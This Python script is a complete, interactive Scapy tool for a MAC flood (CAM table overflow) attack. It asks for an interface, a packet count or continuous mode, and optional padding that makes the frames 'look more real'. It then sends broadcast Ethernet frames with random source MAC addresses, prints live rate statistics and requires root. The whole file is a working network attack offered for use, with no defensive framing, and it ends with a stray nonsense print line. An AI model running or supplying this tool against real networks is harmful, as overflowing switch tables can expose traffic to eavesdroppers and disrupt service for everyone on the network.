#!/usr/bin/env python3
from scapy.all import Ether, RandMAC, sendp
import time
import sys
import os
from datetime import datetime

def print_banner():
    print("="*60)
    print("          MAC FLOOD / CAM TABLE OVERFLOW ATTACK")
    print("                  (Scapy - Layer 2)")
    print("="*60)
    print("="*60 + "\n")

def get_user_input():
    print("=== Configuration ===")
    
    # Interface
    default_iface = "eth0"
    iface = input(f"Enter network interface [{default_iface}]: ").strip()
    if not iface:
        iface = default_iface
    
    # Packet count or continuous
    mode = input("Continuous flood until stopped? (y/n): ").strip().lower()
    if mode == 'y':
        count = 0  # 0 means infinite
        print("[+] Continuous mode enabled (Ctrl+C to stop)")
    else:
        count = int(input("Number of packets to send [100000]: ") or 100000)
    
    # Payload option
    payload_choice = input("Add random payload to frames? (makes them look more real) (y/n): ").strip().lower()
    use_payload = payload_choice == 'y'
    
    print("\n" + "-"*40)
    print(f"Interface     : {iface}")
    print(f"Mode          : {'Continuous' if count == 0 else f'{count:,} packets'}")
    print(f"Payload       : {'Enabled' if use_payload else 'Disabled'}")
    print("-"*40)
    
    confirm = input("\nStart attack? (y/n): ").strip().lower()
    if confirm != 'y':
        print("[-] Attack cancelled.")
        sys.exit(0)
    
    return iface, count, use_payload

def mac_flood(iface, total_packets=0, use_payload=False):
    print(f"\n[+] Starting MAC Flood on {iface} at {datetime.now().strftime('%H:%M:%S')}")
    print("[!] Sending frames with random Source MAC addresses...\n")
    
    sent = 0
    start_time = time.time()
    last_stat_time = start_time
    
    try:
        while True:
            if total_packets > 0 and sent >= total_packets:
                break
                
            # Create packet
            pkt = Ether(
                src=RandMAC(),
                dst="ff:ff:ff:ff:ff:ff"   # Broadcast
            )
            
            if use_payload:
                # Add 32-64 bytes random payload
                payload_size = 32 + (sent % 33)
                pkt = pkt / (b"X" * payload_size)
            
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            
            # Real-time stats every 2000 packets
            if sent % 2000 == 0:
                now = time.time()
                elapsed = now - start_time
                interval = now - last_stat_time
                fps = 2000 / interval if interval > 0 else 0
                
                print(f"[+] Packets sent: {sent:8,} | Rate: {fps:6.1f} fps | "
                      f"Elapsed: {elapsed:6.1f}s", end="\r")
                
                last_stat_time = now
                
    except KeyboardInterrupt:
        print(f"\n\n[!] Attack stopped by user.")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        elapsed = time.time() - start_time
        print(f"\n[+] Attack finished!")
        print(f"    Total frames sent : {sent:,}")
        print(f"    Duration          : {elapsed:.2f} seconds")
        if elapsed > 0:
            print(f"    Average rate      : {sent/elapsed:.1f} frames/sec")

if __name__ == "__main__":
    print_banner()
    
    # Root check
    if os.geteuid() != 0:
        print("[-] Error: This script must be run with sudo/root privileges!")
        print("    Example: sudo python3 mac_flood.py")
        sys.exit(1)
    
    try:
        iface, count, use_payload = get_user_input()
        mac_flood(iface, count, use_payload)
    except KeyboardInterrupt:
        print("\n\n[!] Program terminated.")
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
    
    print("\nFaaaaaah")